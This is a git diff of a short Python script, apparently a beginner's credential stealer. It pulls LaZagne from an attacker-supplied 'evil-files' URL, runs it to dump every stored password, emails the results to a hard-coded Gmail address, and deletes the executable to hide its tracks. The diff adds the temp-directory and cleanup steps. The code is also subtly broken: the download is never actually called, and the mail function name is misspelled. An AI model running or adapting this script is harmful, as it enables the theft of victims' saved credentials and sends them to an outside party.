@@ -1,4 +1,4 @@
-import requests,subprocess,smtplib
+import requests,subprocess,smtplib,os,tempfile
 
 def download(url):
     get_response=requests.get(url)
@@ -13,9 +13,13 @@ def send_mail(email,password,message):
     server.login(email,password)
     server.sendmail(email,"kanavraina11@gmail.com",message)          #send_mail(from,to,message)
     server.quit()
+
+temp_directory=tempfile.gettempdir()                                 #to get location of temp directory
+os.chdir(temp_directory)
 ip=input("Enter your IP")
-download=("https://"+ip+"evil-files/laZagne.exe")
-result=subprocess.check_output("laZagne.exe all",shell=True)
-mail=input("enter your email")
+download=("https://"+ip+"evil-files/laZagne.exe")                    #download virus
+result=subprocess.check_output("laZagne.exe all",shell=True)         #execute it
+mail=input("enter your email")                                   
 password=input("enter your password")
-sendmail(mail,password,result)
+sendmail(mail,password,result)                                       #send report
+os.remove("laZagne.exe")                                             #remove virus
